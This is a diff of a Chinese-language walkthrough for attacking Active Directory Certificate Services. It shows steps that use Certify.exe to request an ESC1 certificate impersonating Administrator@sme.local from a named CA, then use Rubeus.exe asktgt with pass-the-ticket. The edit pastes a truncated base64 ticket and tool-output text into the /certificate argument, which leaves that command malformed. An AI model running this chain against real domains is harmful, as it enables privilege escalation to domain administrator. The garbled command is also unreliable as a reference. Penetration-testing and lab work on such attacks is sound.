@@ -67,12 +67,15 @@ certutil -cainfo name
 
 ### 2.3 請求惡意憑證 (ESC1)
 ```powershell
-.\Certify.exe request --ca "10.0.1.132\SME-SWP-CS" --template "ESC1" --upn "Administrator@sme.local" --out-file admin.pem
+.\Certify.exe request --ca "10.0.1.132\SME-SWP-CS" --template "ESC1" --upn "Administrator@sme.local" 
 ```
 
 ### 2.4 PKINIT 認證
 ```powershell
-.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pem /ptt
+.\Rubeus.exe asktgt /user:Administrator /certificate:<[*] base64(ticket.kirbi):
+
+      doIGUjCCBk6gAwIBBaEDAgEWooIFazCCBWdhggVjMIIFX6ADAgEFoQsbCVNNRS5MT0NBTKIeMBygAwIB
+      AqEVMBMbBmtyYnRndBs...> /ptt
 ```
 
 ### 2.5 驗證權限提升
